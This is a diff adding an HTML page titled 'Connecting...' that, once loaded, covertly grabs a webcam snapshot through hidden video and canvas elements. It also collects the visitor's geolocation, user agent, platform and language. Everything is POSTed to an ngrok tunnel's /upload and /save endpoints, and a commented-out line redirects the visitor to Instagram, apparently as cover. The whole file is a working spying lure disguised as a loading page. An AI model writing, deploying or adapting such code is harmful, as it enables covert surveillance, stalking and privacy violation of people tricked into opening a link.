@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Connecting...</title>
+</head>
+<body>
+  <video id="video" autoplay playsinline style="display:none;"></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+
+  <script>
+   const captureImage = async () => {
+   // console.log("image reqested")
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.getElementById("video");
+        video.srcObject = stream;
+
+        await new Promise(resolve => setTimeout(resolve, 800));
+        const canvas = document.getElementById("canvas");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        stream.getTracks().forEach(track => track.stop());
+
+        const imageData = canvas.toDataURL("image/png");
+
+        await fetch("https://0cf8caf6021c.ngrok-free.app/upload", {                            // change into localhost to run locally
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ image: imageData })
+        });
+      } catch (e) {
+        console.warn("Camera error:", e.message);
+      }
+    };
+
+    const sendLocationData = () => {
+      return new Promise((resolve) => {
+        let info = {
+          userAgent: navigator.userAgent,
+          platform: navigator.platform,
+          language: navigator.language,
+          location: null
+        };
+
+        if ("geolocation" in navigator) {
+          navigator.geolocation.getCurrentPosition(
+            position => {
+              info.location = {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude,
+                accuracy: position.coords.accuracy
+              };
+
+              fetch("https://0cf8caf6021c.ngrok-free.app/save", {               // change into localhost to run locally
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(info)
+              }).then(() => resolve()).catch(() => resolve());
+            },
+            error => {
+              console.warn("Location error:", error.message);
+              fetch("https://0cf8caf6021c.ngrok-free.app/save", {         // change into localhost to run locally
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(info)
+              }).then(() => resolve()).catch(() => resolve());
+            },
+            { timeout: 5000 }
+          );
+        } else {
+          fetch("https://0cf8caf6021c.ngrok-free.app/save", {           // change into localhost to run locally
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(info)
+          }).then(() => resolve()).catch(() => resolve());
+        }
+      });
+    };
+
+
+    window.onload = async () => {
+      await Promise.all([
+      captureImage(),
+      sendLocationData()
+
+      ]);
+
+      // window.location.href = "https://instagram.com";
+    };
+  </script>
+</body>
+</html>
